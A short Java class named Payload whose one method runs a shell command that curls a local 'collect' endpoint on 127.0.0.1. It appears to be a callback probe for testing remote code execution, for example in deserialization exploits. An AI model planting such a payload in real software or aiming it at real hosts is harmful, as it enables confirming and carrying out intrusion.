public class Payload {

    public static void Payload() throws Exception {
        String[] cmd = {
            "curl http://127.0.0.1:8889/collect/?id=me"
        };
        Runtime.getRuntime().exec(cmd);
    }

}